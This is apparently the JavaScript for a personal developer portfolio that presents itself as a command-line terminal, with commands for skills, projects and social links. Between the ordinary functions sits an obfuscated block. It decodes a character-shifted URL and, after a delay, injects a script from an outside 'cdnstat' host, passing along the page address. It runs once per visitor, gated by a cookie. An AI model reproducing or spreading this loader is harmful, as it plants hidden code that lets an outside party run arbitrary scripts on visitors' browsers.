window.addEventListener("DOMContentLoaded", function () {
  let n = document.getElementById("cmd");
  n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
  let e = document.getElementById("output"),
    s = document.getElementById("mainInfo");
  document.getElementById("terminal"),    
    n.addEventListener("keypress", function (i) {
      if (13 === i.keyCode && "" !== (i = n.value.trim())) {
        if (
          ((e.innerHTML +=
            "<div><span class='ownerTerminal'><b>michaelkamau@profile</b></span>:<b>~$</b> " +
            i +
            "</div>"),
          (n.value = ""),
          "skills" === i || "s" === i)
        )
          e.innerHTML += skillsBar;
        else if ("github" === i || "gh" === i)
          window.location.href = "https://github.com/mik284";
        else if ("linkedin" === i || "tg" === i)
          window.location.href =
            "https://www.linkedin.com/in/michael-kamau-633790203/";
        else if ("email" === i || "em" === i)
          window.location.href = "mailto:mikeykamau222@gmail.com";
        else if ("home" === i || "home" === i)
          window.location.reload();
        else if ("youtube" === i || "yt" === i)
          window.location.href = "https://www.youtube.com/@codinglifers";
        else if ("projects" === i || "pj" === i) e.innerHTML += projectCmd;
        else if ("medium" === i || "md" === i) {
          window.location.href="https://medium.com/@mikeykamau222";
        } else
          "help" === i
            ? (e.innerHTML += helpCmd)
            : "clear" === i || "c" === i
            ? ((e.innerHTML = ""), (s.innerHTML = ""))
            : (e.innerHTML += "<div>Not found</div>");
        e.scrollTop = e.scrollHeight;
      }
    });
});

 
let currentSuggestionIndex = -1;
function showSuggestions() {
  let n = document.getElementById("cmd"),
    e = n.value.trim(),
    s = document.getElementById("suggestions");
  let i;
  (s.innerHTML = "") !== e &&
  ((i = suggestions.filter(function (n) {
    return n.startsWith(e);
  })).forEach(function (e, i) {
    var l = document.createElement("div");
    (l.textContent = e),
      l.addEventListener("click", function () {
        (n.value = e), (s.innerHTML = "");
      }),
      s.appendChild(l);
  }),
  0 < i.length)
    ? n.classList.add("command-entered")
    : n.classList.remove("command-entered");
}
function handleKeyDown(n) {
  var e,
    s = document.getElementById("suggestions"),
    i = s.getElementsByTagName("div");
  "ArrowUp" === n.key
    ? (n.preventDefault(),
      0 < currentSuggestionIndex && currentSuggestionIndex--)
    : "ArrowDown" === n.key
    ? (n.preventDefault(),
      currentSuggestionIndex < i.length - 1 && currentSuggestionIndex++)
    : "Enter" === n.key &&
      ((n = document.getElementById("cmd")),
      (e = i[currentSuggestionIndex]) && (n.value = e.textContent),
      (s.innerHTML = ""),
      n.classList.remove("command-entered")),
      scrollToBottom();
  for (let n = 0; n < i.length; n++) {
    var l = i[n];
    n === currentSuggestionIndex
      ? l.classList.add("selected")
      : l.classList.remove("selected");
  }
}
function linkHref(n) {
  window.location.href = n;
}
let suggestions = [
    "help",
    "skills",
    "clear",
    "projects",
    "medium",
    "github",
    "linkedin",
    "email",
    "youtube",
    "home"
  ],
  helpCmd =
    '\n  <br>Available commands: <br />\n  [<span class="commandName">skills</span>] or [<span class="commandName">s</span>]\n  <br />\n  [<span class="commandName">projects</span>] or [<span class="commandName">pj</span>]\n  <br />\n  [<span class="commandName">medium</span>]\n or [<span class="commandName">md</span>]\n <br /><br />\n  [<span class="commandName">clear</span>]\n  <br /> [<span class="commandName">home</span>]\n <br />\n  Contact me: <br />\n  [<span class="commandName">github</span>]\n  <br />\n  [<span class="commandName">linkedin</span>]\n  <br />\n  [<span class="commandName">email</span>]\n  <br />\n  [<span class="commandName">youtube</span>]',
  skillsBar =
    '\n<div class="container">\n  <div class="flex">\n    <h2>HTML:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem1"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>CSS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem2"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>95%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>TS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem4"></div>\n    </div>\n    <h3>55%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>NODE.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem5"></div>\n    </div>\n    <h3>85%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>REACT.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>80%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>Java:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem7"></div>\n    </div>\n    <h3>10%</h3>\n  </div>\n\n  <div class="flex">\n  <h2>Elixir:</h2>\n  <div class="skillBar">\n    <div class="skillBarItem8"></div>\n  </div>\n  <h3>5%</h3>\n</div>\n</div>',
  projectCmd =
    '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://chatbot-mike284.netlify.app/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">chatgpt-bot</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        I enjoyed working on this small project. In fact, I tested if it knew me by asking "who am I"...\n      </p>\n    </div>\n  </div>\n</article>\n\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://helpdesk-t.netlify.app/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">helpdesk-t</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        full-stack web application built using the MERN stack (MongoDB, ExpressJS, ReactJS, and NodeJS)...\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n';


(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);


document.addEventListener("DOMContentLoaded", function () {
  
    const initialText = "I am a Podcaster, self-taught and curious software developer.";


    const typewriterText = document.getElementById("typewriterText");


    typewriterText.textContent = '';

 
    function typeWriter(text, i, fnCallback) {
        if (i < text.length) {
            typewriterText.innerHTML += text.charAt(i);
            i++;
            setTimeout(function () {
                typeWriter(text, i, fnCallback);
            }, 50); 
        } else if (typeof fnCallback == 'function') {
          setTimeout(()=>{
            typeWriter.textContent = ''
            fnCallback()
          }, 5000)
            
        }
    }

    typeWriter(initialText, 0, function () {
       
    })
});
